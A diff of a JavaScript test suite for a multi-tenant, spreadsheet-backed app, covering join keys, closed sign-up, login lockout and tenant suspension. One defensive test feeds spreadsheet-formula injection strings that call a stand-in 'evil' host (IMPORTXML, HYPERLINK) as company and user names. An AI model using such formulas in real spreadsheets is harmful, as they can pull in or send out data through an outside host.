@@ -79,18 +79,55 @@ function err(r, code) { assert.ok(!r.ok, 'expected error ' + code); assert.stric
 var passed = 0;
 function t(name, fn) { try { fn(); passed++; console.log('  ok  ' + name); } catch (e) { console.error('  FAIL ' + name + '\n       ' + (e.stack || e.message).split('\n').slice(0, 3).join('\n       ')); process.exitCode = 1; } }
 
-var A, B, ent, ex, ent2;
-t('sign-up creates a tenant with its own spreadsheet', function () {
-  A = ok(call({ action: 'signup', orgName: 'Alpha Co', name: 'Aisha', email: 'aisha@alpha.sa', password: 'correct-horse-1' }));
-  B = ok(call({ action: 'signup', orgName: 'Beta Co', name: 'Bilal', email: 'bilal@beta.sa', password: 'correct-horse-2' }));
+var A, B, ROOT, KA, KB, ent, ex, ent2;
+t('only the platform owner can open an organisation; everyone else is refused', function () {
+  props.SUPER_ADMINS = 'root@platform.sa';
+  err(call({ action: 'signup', orgName: 'Sneaky Co', name: 'S', email: 'sneaky@x.sa', password: 'long-enough-pw' }), 'signup_closed');
+  ROOT = ok(call({ action: 'signup', orgName: 'Platform', name: 'Root', email: 'root@platform.sa', password: 'root-password-1' }));
+  assert.strictEqual(ROOT.platform, true);
+});
+t('the platform owner creates companies, each with its own sheet and a unique key', function () {
+  var a = ok(call({ action: 'platformTenantCreate', token: ROOT.token, tenant: { name: 'Alpha Co', contact: 'aisha@alpha.sa' } })).tenant;
+  var b = ok(call({ action: 'platformTenantCreate', token: ROOT.token, tenant: { name: 'Beta Co' } })).tenant;
+  assert.ok(/^[A-HJKMNP-Z2-9]{4}-[A-HJKMNP-Z2-9]{4}-[A-HJKMNP-Z2-9]{4}$/.test(a.joinKey), a.joinKey);
+  assert.notStrictEqual(a.joinKey, b.joinKey); assert.notStrictEqual(a.spreadsheetUrl, b.spreadsheetUrl);
+  KA = a.joinKey; KB = b.joinKey;
+  err(call({ action: 'platformTenantCreate', token: ROOT.token, tenant: {} }), 'missing_fields');
+});
+t('people join their company with its key; the first becomes its owner', function () {
+  A = ok(call({ action: 'join', companyKey: KA.toLowerCase().replace(/-/g, ' '), name: 'Aisha', email: 'aisha@alpha.sa', password: 'correct-horse-1' }));
+  assert.strictEqual(A.user.role, 'owner'); assert.strictEqual(A.tenant.name, 'Alpha Co'); assert.strictEqual(A.tenant.joinKey, KA, 'the company owner sees the key to invite colleagues');
+  B = ok(call({ action: 'join', companyKey: KB, name: 'Bilal', email: 'bilal@beta.sa', password: 'correct-horse-2' }));
   assert.notStrictEqual(A.tenant.spreadsheetUrl, B.tenant.spreadsheetUrl);
   var bk = books[A.tenant.spreadsheetUrl.split('/d/')[1]];
   assert.ok(bk._sheets.entities && bk._sheets._chunks && !bk._sheets.Sheet1);
-  assert.deepStrictEqual(bk._viewers, ['aisha@alpha.sa'], 'owner gets view access to their own sheet');
+  assert.deepStrictEqual(bk._viewers, ['aisha@alpha.sa'], 'the company owner gets view access to their own sheet');
+  var M = ok(call({ action: 'join', companyKey: KA, name: 'Mona', email: 'mona@alpha.sa', password: 'mona-password-1' }));
+  assert.strictEqual(M.user.role, 'viewer'); assert.deepStrictEqual(M.user.entityIds, [], 'later joiners see nothing until the owner grants access');
+  assert.strictEqual(M.tenant.joinKey, undefined, 'only the owner sees the key');
+  assert.strictEqual(ok(call({ action: 'list', token: M.token, table: 'entities' })).docs.length, 0);
+});
+t('a wrong or reused key is refused, and guessing keys is limited', function () {
+  err(call({ action: 'join', companyKey: 'AAAA-BBBB-CCCC', name: 'X', email: 'x1@x.sa', password: 'long-enough-pw' }), 'bad_company_key');
+  err(call({ action: 'join', companyKey: KA, name: 'X', email: 'AISHA@alpha.sa', password: 'long-enough-pw' }), 'email_taken');
+  err(call({ action: 'join', companyKey: KA, name: 'X', email: 'x2@x.sa', password: 'short' }), 'weak_password');
+  for (var i = 0; i < 5; i++) err(call({ action: 'join', companyKey: 'ZZZZ-ZZZZ-ZZZ' + i, name: 'G', email: 'guess@x.sa', password: 'long-enough-pw' }), 'bad_company_key');
+  err(call({ action: 'join', companyKey: KA, name: 'G', email: 'guess@x.sa', password: 'long-enough-pw' }), 'too_many_attempts');
+  Object.keys(cache).forEach(function (k) { delete cache[k]; });
+});
+t('a new key stops the old one; only the platform owner can issue it or list companies', function () {
+  err(call({ action: 'platformTenants', token: A.token }), 'forbidden');
+  err(call({ action: 'platformTenantCreate', token: A.token, tenant: { name: 'X' } }), 'forbidden');
+  var list = ok(call({ action: 'platformTenants', token: ROOT.token })).tenants, alpha = list.filter(function (x) { return x.name === 'Alpha Co'; })[0];
+  assert.strictEqual(alpha.users, 2); assert.deepStrictEqual(alpha.owners, ['aisha@alpha.sa']);
+  var nk = ok(call({ action: 'platformTenantKey', token: ROOT.token, id: alpha.id })).tenant.joinKey;
+  assert.notStrictEqual(nk, KA);
+  err(call({ action: 'join', companyKey: KA, name: 'Late', email: 'late@alpha.sa', password: 'long-enough-pw' }), 'bad_company_key');
+  KA = nk;
 });
 t('weak password and duplicate email refused', function () {
-  err(call({ action: 'signup', orgName: 'X', email: 'x@x.sa', password: 'short' }), 'weak_password');
-  err(call({ action: 'signup', orgName: 'X', email: 'AISHA@alpha.sa', password: 'long-enough-pw' }), 'email_taken');
+  err(call({ action: 'signup', orgName: 'X', email: 'root@platform.sa', password: 'short' }), 'weak_password');
+  err(call({ action: 'signup', orgName: 'X', email: 'ROOT@platform.sa', password: 'long-enough-pw' }), 'email_taken');
 });
 t('login: right password works, wrong one does not', function () {
   ok(call({ action: 'login', email: 'aisha@alpha.sa', password: 'correct-horse-1' }));
@@ -104,7 +141,8 @@ t('five wrong passwords lock the account for a while', function () {
   ok(call({ action: 'login', email: 'bilal@beta.sa', password: 'correct-horse-2' }));
 });
 t('user text is written as text, never as a formula; odd ids refused', function () {
-  var X = ok(call({ action: 'signup', orgName: '=IMPORTXML("http://evil","//a")', name: '=HYPERLINK("http://evil")', email: 'eve@evil.sa', password: 'eve-password-1' }));
+  var ek = ok(call({ action: 'platformTenantCreate', token: ROOT.token, tenant: { name: '=IMPORTXML("http://evil","//a")' } })).tenant.joinKey;
+  var X = ok(call({ action: 'join', companyKey: ek, name: '=HYPERLINK("http://evil")', email: 'eve@evil.sa', password: 'eve-password-1' }));
   var bk = books[X.tenant.spreadsheetUrl.split('/d/')[1]], sh = bk._sheets.entities, raw = null, orig = sh.getRange;
   sh.getRange = function (r, c, nr, nc) { var g = orig(r, c, nr, nc); return { getValues: g.getValues, setValues: function (v) { raw = v; g.setValues(v); } }; };
   ok(call({ action: 'save', token: X.token, table: 'entities', doc: { name: '=1+1' } }));
@@ -280,9 +318,9 @@ t('audit trail records changes for managers', function () {
 });
 t('platform admin can list and suspend tenants', function () {
   err(call({ action: 'platformTenants', token: A.token }), 'forbidden');
-  props.SUPER_ADMINS = 'aisha@alpha.sa';
+  props.SUPER_ADMINS = 'root@platform.sa,aisha@alpha.sa';
   var ts = ok(call({ action: 'platformTenants', token: A.token })).tenants;
-  assert.strictEqual(ts.length, 3);
+  assert.strictEqual(ts.length, 4, 'platform, Alpha, Beta and the formula-named company');
   var beta = ts.filter(function (x) { return x.name === 'Beta Co'; })[0];
   ok(call({ action: 'platformTenantStatus', token: A.token, id: beta.id, status: 'suspended' }));
   err(call({ action: 'me', token: B.token }), 'tenant_suspended');
